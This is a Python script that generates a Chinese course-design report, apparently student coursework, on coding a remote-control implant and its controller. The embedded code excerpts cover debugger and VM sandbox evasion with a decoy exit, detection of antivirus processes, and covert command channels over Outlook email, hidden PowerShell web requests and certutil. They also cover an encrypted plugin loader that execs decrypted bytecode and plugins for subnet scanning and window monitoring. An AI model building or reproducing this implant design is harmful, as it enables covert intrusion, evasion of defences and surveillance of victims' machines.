# -*- coding: utf-8 -*-
"""生成《第三天报告.docx》—— 网络安全编程课程设计：编码实现"""

from docx import Document
from docx.shared import Pt, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml


def set_cell_shading(cell, color_hex):
    """设置单元格底色"""
    shading = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color_hex}"/>')
    cell._tc.get_or_add_tcPr().append(shading)


def set_run_font(run, font_name_cn, font_name_en, size, bold=False, color=None):
    """统一设置 run 的中英文字体"""
    run.font.size = Pt(size)
    run.bold = bold
    run.font.name = font_name_en
    rpr = run._element.get_or_add_rPr()
    rFonts = rpr.find(qn('w:rFonts'))
    if rFonts is None:
        rFonts = parse_xml(f'<w:rFonts {nsdecls("w")}/>')
        rpr.insert(0, rFonts)
    rFonts.set(qn('w:eastAsia'), font_name_cn)
    if color:
        run.font.color.rgb = RGBColor(*color)


def add_heading_custom(doc, text, level, alignment=WD_ALIGN_PARAGRAPH.LEFT):
    """添加黑体标题"""
    p = doc.add_paragraph()
    p.alignment = alignment
    pf = p.paragraph_format
    pf.space_before = Pt(16 if level == 1 else 10)
    pf.space_after = Pt(8 if level == 1 else 5)

    if level == 1:
        size = 22
    elif level == 2:
        size = 16
    else:
        size = 14

    run = p.add_run(text)
    set_run_font(run, '黑体', 'SimHei', size, bold=True)

    pPr = p._element.get_or_add_pPr()
    outline = parse_xml(f'<w:outlineLvl {nsdecls("w")} w:val="{level - 1}"/>')
    pPr.append(outline)
    return p


def add_body_text(doc, text, indent_first_line=True, bold=False, space_after=6):
    """添加宋体正文段落"""
    p = doc.add_paragraph()
    pf = p.paragraph_format
    pf.space_after = Pt(space_after)
    pf.line_spacing = Pt(20)
    if indent_first_line:
        pf.first_line_indent = Cm(0.74)

    run = p.add_run(text)
    set_run_font(run, '宋体', 'SimSun', 12, bold=bold)
    return p


def add_body_mixed(doc, segments, indent_first_line=True):
    """添加混合格式正文段落"""
    p = doc.add_paragraph()
    pf = p.paragraph_format
    pf.space_after = Pt(6)
    pf.line_spacing = Pt(20)
    if indent_first_line:
        pf.first_line_indent = Cm(0.74)

    for seg in segments:
        if len(seg) == 2:
            text, bold = seg
            run = p.add_run(text)
            set_run_font(run, '宋体', 'SimSun', 12, bold=bold)
        else:
            text, bold, font_cn, font_en, size = seg
            run = p.add_run(text)
            set_run_font(run, font_cn, font_en, size, bold=bold)
    return p


def add_code_block(doc, text):
    """添加代码块（灰底 Consolas 9pt）"""
    p = doc.add_paragraph()
    pf = p.paragraph_format
    pf.space_before = Pt(4)
    pf.space_after = Pt(4)
    pf.left_indent = Cm(0.5)

    pPr = p._element.get_or_add_pPr()
    shd = parse_xml(f'<w:shd {nsdecls("w")} w:val="clear" w:color="auto" w:fill="F2F2F2"/>')
    pPr.append(shd)

    run = p.add_run(text)
    set_run_font(run, 'Consolas', 'Consolas', 9)
    return p


def add_code_blocks(doc, lines):
    """为多行代码逐行创建灰底代码块"""
    for line in lines:
        add_code_block(doc, line)


def create_table(doc, headers, rows, col_widths=None):
    """创建带边框的表格"""
    table = doc.add_table(rows=1 + len(rows), cols=len(headers))
    table.alignment = WD_TABLE_ALIGNMENT.CENTER

    tbl = table._tbl
    tblPr = tbl.tblPr if tbl.tblPr is not None else parse_xml(f'<w:tblPr {nsdecls("w")}/>')
    borders = parse_xml(
        f'<w:tblBorders {nsdecls("w")}>'
        '  <w:top w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:left w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:right w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:insideH w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '  <w:insideV w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        '</w:tblBorders>'
    )
    tblPr.append(borders)

    for i, h in enumerate(headers):
        cell = table.rows[0].cells[i]
        cell.text = ''
        p = cell.paragraphs[0]
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        run = p.add_run(h)
        set_run_font(run, '黑体', 'SimHei', 11, bold=True)
        set_cell_shading(cell, 'D9E2F3')

    for r_idx, row in enumerate(rows):
        for c_idx, val in enumerate(row):
            cell = table.rows[r_idx + 1].cells[c_idx]
            cell.text = ''
            p = cell.paragraphs[0]
            p.alignment = WD_ALIGN_PARAGRAPH.CENTER
            run = p.add_run(val)
            set_run_font(run, '宋体', 'SimSun', 11)

    if col_widths:
        for i, w in enumerate(col_widths):
            for row in table.rows:
                row.cells[i].width = Cm(w)

    return table


def main():
    doc = Document()

    # ========== 页面设置 A4 ==========
    section = doc.sections[0]
    section.page_width = Cm(21.0)
    section.page_height = Cm(29.7)
    section.top_margin = Cm(2.54)
    section.bottom_margin = Cm(2.54)
    section.left_margin = Cm(3.17)
    section.right_margin = Cm(3.17)

    # ========== 封面标题 ==========
    p_title = doc.add_paragraph()
    p_title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    pf = p_title.paragraph_format
    pf.space_before = Pt(80)
    pf.space_after = Pt(12)
    run = p_title.add_run('网络安全编程课程设计')
    set_run_font(run, '黑体', 'SimHei', 28, bold=True)

    p_sub = doc.add_paragraph()
    p_sub.alignment = WD_ALIGN_PARAGRAPH.CENTER
    pf2 = p_sub.paragraph_format
    pf2.space_after = Pt(10)
    run2 = p_sub.add_run('第三天报告')
    set_run_font(run2, '黑体', 'SimHei', 22, bold=True)

    p_topic = doc.add_paragraph()
    p_topic.alignment = WD_ALIGN_PARAGRAPH.CENTER
    pf3 = p_topic.paragraph_format
    pf3.space_after = Pt(40)
    run3 = p_topic.add_run('编码实现')
    set_run_font(run3, '黑体', 'SimHei', 18, bold=False)

    p_date = doc.add_paragraph()
    p_date.alignment = WD_ALIGN_PARAGRAPH.CENTER
    pf4 = p_date.paragraph_format
    pf4.space_after = Pt(60)
    run4 = p_date.add_run('2026 年 6 月')
    set_run_font(run4, '宋体', 'SimSun', 14)

    # ========== 一、项目文件结构 ==========
    add_heading_custom(doc, '一、项目文件结构', 2)

    tree = [
        r'项目根目录/',
        r'├── shared/',
        r'│   ├── protocol.py         # 通信协议',
        r'│   └── crypto.py           # 加密引擎',
        r'├── controller/',
        r'│   ├── main.py             # 控制端主程序',
        r'│   ├── comm_server.py      # TCP 通信服务端',
        r'│   └── utils.py            # 格式化输出、日志',
        r'├── agent/',
        r'│   ├── main.py             # Agent 主程序',
        r'│   ├── sandbox_detect.py   # 沙箱检测',
        r'│   ├── env_perception.py   # 环境感知',
        r'│   ├── comm_channels.py    # 多通路通信',
        r'│   ├── module_loader.py    # 模块加载器',
        r'│   ├── frag_transfer.py    # 分片传输',
        r'│   ├── utils.py            # 系统工具函数',
        r'│   └── plugins/',
        r'│       ├── recon.py        # 网络侦察',
        r'│       ├── netprobe.py     # 内网探测',
        r'│       └── winmon.py       # 窗口监控',
        r'├── pack_plugin.py          # 插件打包工具',
        r'└── key.txt                 # 插件加密密钥',
    ]
    add_code_blocks(doc, tree)

    # ========== 二、通信协议模块 ==========
    add_heading_custom(doc, '二、通信协议模块（shared/protocol.py）', 2)

    add_body_text(
        doc,
        '定义了消息类型常量和指令类型常量，使用 Protocol 类封装消息的构建与解析。'
    )
    add_body_text(doc, '消息类型包括：cmd（指令）、result（结果）、heartbeat（心跳）、register（注册）、key_exchange（密钥交换）。', bold=False)
    add_body_text(doc, '指令类型包括：exec、download、upload、sysinfo、modules、load_mod、run_mod、shell、netprobe、winmon、exit。', bold=False)
    add_body_text(doc, '核心方法：')

    code_proto = [
        'class Protocol:',
        '    @staticmethod',
        '    def build_command(cmd_type: str, args: dict = None) -> bytes:',
        '        payload = {',
        '            "command": cmd_type,',
        '            "args": args or {},',
        '            "timestamp": time.time(),',
        '        }',
        '        return json.dumps(payload, ensure_ascii=False).encode("utf-8")',
        '',
        '    @staticmethod',
        '    def parse_command(data: bytes) -> dict:',
        '        return json.loads(data.decode("utf-8"))',
        '',
        '    @staticmethod',
        '    def build_result(status: str, data: str, error: str = None) -> bytes:',
        '        payload = {',
        '            "status": status, "data": data,',
        '            "error": error, "timestamp": time.time(),',
        '        }',
        '        return json.dumps(payload, ensure_ascii=False).encode("utf-8")',
    ]
    add_code_blocks(doc, code_proto)

    # ========== 三、加密引擎模块 ==========
    add_heading_custom(doc, '三、加密引擎模块（shared/crypto.py）', 2)

    add_body_text(
        doc,
        '实现了 RSA-2048 + AES-256-GCM 混合加密引擎 CryptoEngine 类。'
    )

    add_body_text(doc, 'RSA 密钥管理：')
    code_rsa = [
        'class CryptoEngine:',
        '    def generate_rsa_keypair(self, bits=2048):',
        '        self.rsa_key = RSA.generate(bits)',
        '        return self.rsa_key',
        '',
        '    def encrypt_session_key(self) -> bytes:',
        '        cipher = PKCS1_OAEP.new(self.peer_public_key)',
        '        return cipher.encrypt(self.session_key)',
        '',
        '    def decrypt_session_key(self, encrypted_key: bytes) -> bytes:',
        '        cipher = PKCS1_OAEP.new(self.rsa_key)',
        '        self.session_key = cipher.decrypt(encrypted_key)',
        '        return self.session_key',
    ]
    add_code_blocks(doc, code_rsa)

    add_body_text(doc, 'AES-256-GCM 加解密：')
    code_aes = [
        '    def aes_encrypt(self, plaintext: bytes, key=None) -> tuple:',
        '        k = key or self.session_key',
        '        cipher = AES.new(k, AES.MODE_GCM)',
        '        ciphertext, tag = cipher.encrypt_and_digest(plaintext)',
        '        return cipher.nonce, ciphertext, tag',
        '',
        '    def aes_decrypt(self, nonce, ciphertext, tag, key=None) -> bytes:',
        '        k = key or self.session_key',
        '        cipher = AES.new(k, AES.MODE_GCM, nonce=nonce)',
        '        return cipher.decrypt_and_verify(ciphertext, tag)',
    ]
    add_code_blocks(doc, code_aes)

    add_body_text(
        doc,
        '消息加密结构包含 header、encrypted_key（RSA 加密的 AES 密钥）、nonce、payload（AES-GCM 密文）、tag。'
        '传输时序列化为 JSON，二进制字段使用 base64 编码，外层添加 4 字节大端序长度前缀解决 TCP 粘包问题。'
    )

    # ========== 四、沙箱检测模块 ==========
    add_heading_custom(doc, '四、沙箱检测模块（agent/sandbox_detect.py）', 2)

    add_body_text(
        doc,
        'SandboxDetector 类实现了 11 项检测，通过 ctypes 调用 Windows API：'
    )
    code_sandbox = [
        'class SandboxDetector:',
        '    def check_debugger_present(self):',
        '        return bool(kernel32.IsDebuggerPresent())',
        '',
        '    def check_remote_debugger(self):',
        '        is_debugged = ctypes.wintypes.BOOL(False)',
        '        handle = kernel32.GetCurrentProcess()',
        '        kernel32.CheckRemoteDebuggerPresent(handle, ctypes.byref(is_debugged))',
        '        return bool(is_debugged)',
        '',
        '    def check_vm_registry(self):',
        '        for hive, path in VM_REGISTRY_KEYS:',
        '            hkey = ctypes.wintypes.HKEY()',
        '            ret = advapi32.RegOpenKeyExW(hive, path, 0, KEY_READ, ctypes.byref(hkey))',
        '            if ret == 0:',
        '                advapi32.RegCloseKey(hkey)',
        '                return True',
        '        return False',
        '',
        '    def check_mouse_movement(self):',
        '        positions = []',
        '        for _ in range(3):',
        '            ci = CURSORINFO()',
        '            ci.cbSize = ctypes.sizeof(CURSORINFO)',
        '            user32.GetCursorInfo(ctypes.byref(ci))',
        '            positions.append((ci.ptScreenPos.x, ci.ptScreenPos.y))',
        '            time.sleep(0.3)',
        '        return len(set(positions)) == 1',
        '',
        '    def run_all_checks(self):',
        '        # 运行所有检测，加权求和',
        '        ratio = self.risk_score / max(self.max_score, 1)',
        '        if ratio >= 0.5:',
        '            level = "sandbox"',
        '        elif ratio >= 0.25:',
        '            level = "suspicious"',
        '        else:',
        '            level = "safe"',
        '        return {"risk_score": self.risk_score, "level": level, ...}',
    ]
    add_code_blocks(doc, code_sandbox)

    # ========== 五、环境感知模块 ==========
    add_heading_custom(doc, '五、环境感知模块（agent/env_perception.py）', 2)

    add_body_text(
        doc,
        'EnvPerception 类通过 WMI 或 subprocess 采集系统信息，识别安全软件和白名单软件。'
    )
    code_env = [
        'SECURITY_SOFTWARE = {',
        '    "火绒": ["HipsTray.exe", "HipsMain.exe", ...],',
        '    "360": ["360tray.exe", "360sd.exe", ...],',
        '    "Windows Defender": ["MsMpEng.exe", "NisSrv.exe", ...],',
        '    # 覆盖 8 种安全软件',
        '}',
        '',
        'WHITELIST_SOFTWARE = {',
        '    "Outlook": ["OUTLOOK.EXE", "olk.exe"],',
        '    "微信": ["WeChat.exe"],',
        '    "Chrome": ["chrome.exe"],',
        '    # 覆盖 11 种常用软件',
        '}',
        '',
        'class EnvPerception:',
        '    def collect_processes(self):',
        '        output = subprocess.check_output("tasklist /FO CSV /NH", ...)',
        '        proc_lower = {p.lower() for p in self.profile.running_processes}',
        '        for name, proc_list in SECURITY_SOFTWARE.items():',
        '            for proc in proc_list:',
        '                if proc.lower() in proc_lower:',
        '                    self.profile.security_software.append(name)',
        '                    break',
    ]
    add_code_blocks(doc, code_env)

    add_body_text(
        doc,
        'WMI 查询支持双模式：优先使用 wmi 库，失败则回退到 subprocess + wmic 命令。'
    )

    # ========== 六、多通路通信模块 ==========
    add_heading_custom(doc, '六、多通路通信模块（agent/comm_channels.py）', 2)

    add_body_text(
        doc,
        '采用策略模式，BaseChannel 抽象基类定义统一接口（connect/send/recv/close），6 种通道实现：'
    )
    code_channel = [
        'class BaseChannel(ABC):',
        '    @abstractmethod',
        '    def connect(self, **kwargs) -> bool: ...',
        '    @abstractmethod',
        '    def send(self, data: bytes, msg_type: str) -> bool: ...',
        '    @abstractmethod',
        '    def recv(self) -> Optional[bytes]: ...',
        '    @abstractmethod',
        '    def close(self): ...',
    ]
    add_code_blocks(doc, code_channel)

    add_body_text(doc, '各通道实现概要：', bold=False)

    channels_desc = [
        'TCPChannel：TCP Socket 客户端通信，支持精确接收 n 字节（_recv_exact），超时不视为断开。',
        'TCPServerChannel：TCP Socket 服务端通道（Controller 使用），支持 listen/accept。',
        'UDPChannel：UDP Socket + 自动分片（60KB/片），支持多片重组。',
        'OutlookChannel：通过 win32com.client 操作 Outlook COM 对象，数据编码为 base64 放入邮件正文。',
        'PowerShellChannel：通过 subprocess 调用 PowerShell Invoke-WebRequest，-WindowStyle Hidden 隐藏窗口。',
        'CertutilChannel：利用 certutil 编解码，通过共享目录交换数据。',
    ]
    for ch in channels_desc:
        add_body_text(doc, ch)

    add_body_text(doc, 'ChannelManager 管理器根据 EnvProfile 选择通道并按优先级连接：')
    code_mgr = [
        'def select_channels(self, env_profile):',
        '    selected = ["tcp"]',
        '    if env_profile.has_outlook():',
        '        selected.append("outlook")',
        '    selected.append("powershell")',
        '    selected.append("udp")',
        '    selected.append("certutil")',
        '    return selected',
        '',
        'def connect_best(self, env_profile, **kwargs):',
        '    for ch_type in self.select_channels(env_profile):',
        '        channel = self.create_channel(ch_type)',
        '        if channel.connect(**kwargs):',
        '            return channel',
        '    return None',
    ]
    add_code_blocks(doc, code_mgr)

    # ========== 七、模块加载器 ==========
    add_heading_custom(doc, '七、模块加载器（agent/module_loader.py）', 2)

    add_body_text(
        doc,
        '实现了 EncryptedModuleFinder（sys.meta_path 钩子）和 load_plugin_direct（直接加载）两种方式。'
    )
    code_loader = [
        'def load_plugin_direct(plugin_dir, module_name, crypto_engine):',
        '    enc_path = os.path.join(plugin_dir, f"{module_name}.enc")',
        '    with open(enc_path, "rb") as f:',
        '        data = f.read()',
        '    # 解析: [nonce_len][nonce][tag_len][tag][ciphertext]',
        '    offset = 0',
        '    nonce_len = struct.unpack_from("!I", data, offset)[0]',
        '    offset += 4',
        '    nonce = data[offset:offset + nonce_len]',
        '    ...',
        '    pyc_data = crypto_engine.aes_decrypt(nonce, ciphertext, tag)',
        '    code = marshal.loads(pyc_data[16:])  # 跳过 .pyc 头',
        '    module = types.ModuleType(module_name)',
        '    exec(code, module.__dict__)',
        '    return module',
    ]
    add_code_blocks(doc, code_loader)

    add_body_text(
        doc,
        '插件密钥与通信密钥分离：Agent 使用独立的 plugin_crypto 从 key.txt 加载插件密钥。'
    )

    # ========== 八、分片传输模块 ==========
    add_heading_custom(doc, '八、分片传输模块（agent/frag_transfer.py）', 2)

    add_body_text(doc, 'Fragmenter 负责分片，Reassembler 负责重组：')
    code_frag = [
        'class Fragmenter:',
        '    DEFAULT_CHUNK_SIZE = 4096',
        '',
        '    def fragment(self, data: bytes) -> List[dict]:',
        '        total_chunks = ceil(len(data) / self.chunk_size)',
        '        for i in range(total_chunks):',
        '            chunk_data = data[i*self.chunk_size : (i+1)*self.chunk_size]',
        '            yield {"transfer_id": tid, "chunk_index": i,',
        '                   "total_chunks": total_chunks, "data": chunk_data,',
        '                   "checksum": sum(chunk_data) & 0xFFFFFFFF}',
    ]
    add_code_blocks(doc, code_frag)

    add_body_text(doc, 'FragmentedSender 封装完整发送流程，每片间隔 0.1 秒。')

    # ========== 九、插件打包工具 ==========
    add_heading_custom(doc, '九、插件打包工具（pack_plugin.py）', 2)

    add_body_text(doc, '将 .py 文件编译为 .pyc 后 AES 加密，流程如下：')
    code_pack = [
        '.py 源码 → py_compile.compile() → .pyc 字节码 → AES-256-GCM 加密 → .enc 文件',
    ]
    add_code_blocks(doc, code_pack)

    add_body_text(doc, '同时生成加密的插件清单 __enc_manifest__。')

    # ========== 十、控制端主程序 ==========
    add_heading_custom(doc, '十、控制端主程序（controller/main.py + comm_server.py）', 2)

    add_body_text(
        doc,
        'CommServer 实现 TCP 监听，每个连接独立线程和加密引擎：'
    )
    code_ctrl = [
        'class CommServer:',
        '    def _accept_loop(self):',
        '        while self._running:',
        '            client_sock, addr = self.server_sock.accept()',
        '            agent_crypto = CryptoEngine()',
        '            agent_crypto.generate_rsa_keypair()',
        '            self._sessions[session_id] = {"sock": client_sock, "crypto": agent_crypto}',
        '            # 发送公钥，启动接收线程',
        '            self._send_public_key(session_id, client_sock, agent_crypto)',
    ]
    add_code_blocks(doc, code_ctrl)

    add_body_text(
        doc,
        'Controller 提供 CLI 交互界面，支持 sessions/select/exec/shell/sysinfo/download/upload/modules/load_mod/run_mod/netprobe/winmon 等命令。'
    )

    # ========== 十一、Agent 主程序 ==========
    add_heading_custom(doc, '十一、Agent 主程序（agent/main.py）', 2)

    add_body_text(doc, 'Agent 7 阶段生命周期：')
    code_agent = [
        'def run(self):',
        '    # Phase 1: 沙箱检测',
        '    sandbox_result = SandboxDetector().run_all_checks()',
        '    if sandbox_result["level"] == "sandbox":',
        '        self._decoy_exit(); return',
        '    # Phase 2: 环境感知',
        '    self.env_profile = EnvPerception().run()',
        '    # Phase 3: RSA 密钥生成',
        '    self.crypto.generate_rsa_keypair()',
        '    # Phase 4: 建立通信',
        '    channel = self._connect_with_retry()',
        '    # Phase 5: 密钥交换',
        '    self._key_exchange(channel)',
        '    # Phase 6: 注册上线',
        '    self._send_registration(channel)',
        '    # Phase 7: 指令循环',
        '    self._command_loop(channel)',
    ]
    add_code_blocks(doc, code_agent)

    add_body_text(
        doc,
        '指令执行支持分片返回大数据，插件使用独立的 plugin_crypto 解密。'
    )

    # ========== 十二、编码统计 ==========
    add_heading_custom(doc, '十二、编码统计', 2)

    create_table(
        doc,
        headers=['模块', '文件', '主要类/函数', '代码行数（约）'],
        rows=[
            ['通信协议', 'shared/protocol.py', 'Protocol', '100'],
            ['加密引擎', 'shared/crypto.py', 'CryptoEngine', '190'],
            ['控制端主程序', 'controller/main.py', 'Controller', '488'],
            ['TCP 服务端', 'controller/comm_server.py', 'CommServer', '229'],
            ['控制端工具', 'controller/utils.py', 'format_size/format_duration', '53'],
            ['Agent 主程序', 'agent/main.py', 'Agent', '600'],
            ['沙箱检测', 'agent/sandbox_detect.py', 'SandboxDetector', '282'],
            ['环境感知', 'agent/env_perception.py', 'EnvPerception', '230'],
            ['多通路通信', 'agent/comm_channels.py', '6种Channel + ChannelManager', '698'],
            ['模块加载器', 'agent/module_loader.py', 'EncryptedModuleFinder', '194'],
            ['分片传输', 'agent/frag_transfer.py', 'Fragmenter/Reassembler', '212'],
            ['Agent 工具', 'agent/utils.py', 'is_admin/secure_delete/get_system_info', '80'],
            ['插件打包', 'pack_plugin.py', 'pack_single/build_manifest', '157'],
            ['网络侦察', 'agent/plugins/recon.py', 'run/_parse_*', '146'],
            ['内网探测', 'agent/plugins/netprobe.py', 'scan_subnet()', '159'],
            ['窗口监控', 'agent/plugins/winmon.py', 'monitor_window_changes()', '109'],
            ['合计', '', '', '约 3780'],
        ],
        col_widths=[2.5, 4.5, 4, 2.5],
    )

    # ========== 保存 ==========
    output_path = r'E:\课设2\第三天报告.docx'
    doc.save(output_path)
    print(f'文档已生成: {output_path}')


if __name__ == '__main__':
    main()
